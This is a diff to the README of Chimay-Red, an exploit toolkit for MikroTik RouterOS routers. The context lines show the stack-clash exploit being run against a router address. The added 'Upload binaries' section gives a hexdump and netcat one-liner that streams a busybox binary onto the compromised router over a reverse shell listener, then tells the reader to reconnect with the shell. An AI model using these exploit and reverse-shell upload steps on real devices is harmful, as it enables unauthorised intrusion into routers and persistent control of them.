@@ -58,7 +58,15 @@ Funny command
 $ ./tools/getROSbin.py 6.38.4 mipsbe /nova/bin/www www_binary
 $ ./StackClash_mips.py 192.168.8.1 80 www_binary "echo hello world > /dev/lcd"
 ```
-![image](https://github.com/BigNerd95/Chimay-Red/raw/master/docs/screen_image.jpg)
+![image](https://github.com/BigNerd95/Chimay-Red/raw/master/docs/screen_image.jpg)  
+
+### Upload binaries
+On PC run:  
+```
+$ hexdump -v -e '"echo -e -n " 1024/1 "\\\\x%02X" " >> /ram/busybox\n"' busybox-mips | sed -e "s/\\\\\\\\x  //g" | nc -l -q 0 -p 1234
+```  
+In another shell run reverse shell command.  
+Once the file is uploaded, run again reverse shell (this time only with `nc -l -p 1234`) and you will find busybox inside `/ram/`.
 
 # FAQ
 #### Where does one get the chimay-red.py file, that this tool kit relies on?  
